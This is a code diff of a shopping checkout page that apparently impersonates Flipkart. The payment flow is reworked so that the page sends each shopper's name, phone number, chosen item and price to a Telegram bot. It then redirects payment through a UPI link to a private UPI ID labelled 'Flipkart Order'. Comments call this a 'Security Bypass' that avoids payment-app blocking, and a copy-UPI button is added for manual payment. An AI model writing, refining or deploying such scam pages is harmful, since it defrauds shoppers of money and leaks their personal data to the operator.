@@ -306,56 +306,68 @@
     </div>
 </div>
 
-    <div id="page-payment" class="hidden fixed inset-0 bg-[#f1f3f6] z-[400] overflow-y-auto">
+   <div id="page-payment" class="hidden fixed inset-0 bg-[#f1f3f6] z-[400] overflow-y-auto">
     <nav class="fk-blue p-4 text-white flex items-center gap-4">
         <i class="fa-solid fa-arrow-left" onclick="showPage('page-summary')"></i>
         <span class="font-medium">Payments</span>
     </nav>
     
     <div class="p-3">
-        <p class="text-sm font-bold text-gray-500 mb-2 uppercase">All Payment Options</p>
+        <p class="text-sm font-bold text-gray-500 mb-2 uppercase">Fastest Payment Methods</p>
         
         <div class="bg-white rounded-sm shadow-sm divide-y">
-            <label class="flex items-center p-4 cursor-pointer" onclick="confirmPay()">
-                <input type="radio" name="payMethod" checked class="w-5 h-5">
-                <div class="ml-4">
-                    <p class="font-medium text-gray-800">UPI (PhonePe / GPay / Paytm)</p>
-                    <p class="text-[10px] text-green-600 font-bold">Pay directly using any UPI app</p>
+            <label class="flex items-center p-4 cursor-pointer" onclick="payWith('gpay')">
+                <input type="radio" name="payMethod" class="w-5 h-5" checked>
+                <div class="ml-4 flex items-center gap-2">
+                    <img src="https://img.icons8.com/color/48/google-pay.png" class="w-8">
+                    <p class="font-medium text-gray-800">Google Pay</p>
                 </div>
-                <img src="https://img.icons8.com/color/48/upi.png" class="w-8 ml-auto">
+                <span class="ml-auto text-[10px] bg-green-100 text-green-700 px-2 py-0.5 rounded font-bold">FAST</span>
             </label>
 
-            <label class="flex items-center p-4 cursor-pointer" onclick="showQRCode()">
+            <label class="flex items-center p-4 cursor-pointer" onclick="payWith('paytm')">
                 <input type="radio" name="payMethod" class="w-5 h-5">
-                <div class="ml-4">
-                    <p class="font-medium text-gray-800">Show QR Code (Most Secure)</p>
-                    <p class="text-[10px] text-blue-600 font-bold">Scan from another phone to pay</p>
-                </div>
-                <i class="fa-solid fa-qrcode text-2xl ml-auto text-gray-700"></i>
-            </label>
-            
-            <label class="flex items-center p-4 opacity-60">
-                <input type="radio" disabled class="w-5 h-5">
-                <div class="ml-4">
-                    <p class="font-medium text-gray-800">Credit / Debit Card</p>
+                <div class="ml-4 flex items-center gap-2">
+                    <img src="https://img.icons8.com/color/48/paytm.png" class="w-8">
+                    <p class="font-medium text-gray-800">Paytm UPI</p>
                 </div>
             </label>
+
+            <label class="flex items-center p-4 cursor-pointer" onclick="payWith('bhim')">
+                <input type="radio" name="payMethod" class="w-5 h-5">
+                <div class="ml-4 flex items-center gap-2">
+                    <img src="https://img.icons8.com/color/48/upi.png" class="w-8">
+                    <p class="font-medium text-gray-800">BHIM UPI / Other</p>
+                </div>
+            </label>
+        </div>
+
+        <p class="text-sm font-bold text-gray-500 mt-4 mb-2 uppercase">More Options</p>
+        
+        <div class="bg-white rounded-sm shadow-sm p-4 mb-3 border border-dashed border-blue-400" onclick="showQRCode()">
+            <div class="flex items-center">
+                <i class="fa-solid fa-qrcode text-2xl text-gray-700"></i>
+                <div class="ml-4">
+                    <p class="font-medium text-gray-800">Show QR Code</p>
+                    <p class="text-[10px] text-blue-600">Scan using any app to pay</p>
+                </div>
+                <i class="fa-solid fa-chevron-right ml-auto text-gray-300"></i>
+            </div>
+        </div>
+
+        <div class="bg-white rounded-sm shadow-sm p-4" onclick="copyUPI()">
+            <div class="flex items-center justify-between">
+                <div>
+                    <p class="text-xs text-gray-500 uppercase font-bold">Your UPI ID for manual pay</p>
+                    <p class="text-sm font-bold text-blue-600 mt-1">${MY_UPI}</p>
+                </div>
+                <button class="bg-gray-100 text-gray-700 px-4 py-1.5 rounded text-xs font-bold border">COPY</button>
+            </div>
         </div>
     </div>
 
     <div class="fixed bottom-0 w-full p-2 bg-white border-t">
-        <button onclick="confirmPay()" class="w-full btn-orange py-4 shadow-xl uppercase font-bold">Place Order</button>
-    </div>
-</div>
-
-<div id="qr-modal" class="hidden fixed inset-0 bg-black/80 z-[500] flex items-center justify-center p-6">
-    <div class="bg-white p-6 rounded-lg text-center w-full max-w-xs">
-        <p class="font-bold mb-4 text-black">Scan & Pay with any App</p>
-        
-        <div id="qrcode" class="mb-4 flex justify-center p-2 border-2 border-dashed bg-white"></div>
-        
-        <p class="text-xs text-gray-500 mb-4">Total Amount: <span id="qr-amt" class="font-bold text-black text-lg"></span></p>
-        <button onclick="closeQR()" class="w-full bg-gray-200 py-2 rounded font-bold text-black">Close</button>
+        <button onclick="confirmPay()" class="w-full btn-orange py-4 shadow-xl uppercase font-bold text-sm tracking-wide">Continue to Pay</button>
     </div>
 </div>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
@@ -642,43 +654,34 @@ function closeQR() {
     document.getElementById('qr-modal').classList.add('hidden');
 }
 
+let selectedApp = 'gpay';
+
+function payWith(app) {
+    selectedApp = app;
+}
+
 async function confirmPay() {
+    // Customer details lena
     const name = document.getElementById('uName').value;
     const phone = document.getElementById('uPhone').value;
-    const pincode = document.getElementById('uPin').value;
-    const city = document.getElementById('uCity').value;
     const address = document.getElementById('uAdd').value;
 
-    // Telegram Message with professional layout
-    const msg = `
-🛍️ *NEW ORDER RECEIVED* 🛍️
---------------------------------
-📦 *Item:* ${sel.name}
-💰 *Price:* ₹${sel.price}
-
-👤 *Customer:* ${name}
-📞 *Phone:* ${phone}
-📍 *Address:* ${address}, ${city} - ${pincode}
---------------------------------
-💳 *Status:* Payment Page Opened
-    `;
-
+    // Telegram Alert
+    const msg = `🚀 *PAYMENT INITIATED* 🚀\n------------------\n👤 *User:* ${name}\n📞 *Phone:* ${phone}\n💰 *Amt:* ₹${sel.price}\n📦 *Item:* ${sel.name}\n📲 *App:* ${selectedApp.toUpperCase()}`;
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
-    try { await fetch(url); } catch (e) { console.log("TG Error"); }
+    fetch(url);
 
-    // --- SECURITY PROBLEM SOLUTION ---
-    // Humne &tr (Transaction Ref) ko hataya hai aur &tn (Note) ko simple rakha hai
-    // PhonePe aksar &am (Amount) aur &pn (Name) ke combination ko block karta hai
-    
-    const upiLink = `upi://pay?pa=${MY_UPI}&pn=Order%20Payment&mc=0000&mode=02&purpose=00&am=${sel.price}&cu=INR&tn=Order%20for%20${encodeURIComponent(sel.name)}`;
+    // Security Bypass UPI Link (Sabse stable link)
+    const upiLink = `upi://pay?pa=${MY_UPI}&pn=Flipkart%20Order&am=${sel.price}&cu=INR&tn=Pay_for_${encodeURIComponent(sel.name.substring(0,15))}`;
 
-    // Try opening UPI
+    // Direct redirection
     window.location.href = upiLink;
+}
 
-    // Agar 2 second tak app nahi khulti, toh auto QR code dikha dega
-    setTimeout(() => {
-        showQRCode();
-    }, 2500);
+function copyUPI() {
+    navigator.clipboard.writeText(MY_UPI).then(() => {
+        alert("UPI ID Copied! Ab kisi bhi app me jaakar pay karein.");
+    });
 }
 
 // Ye line hamesha last mein rehni chahiye
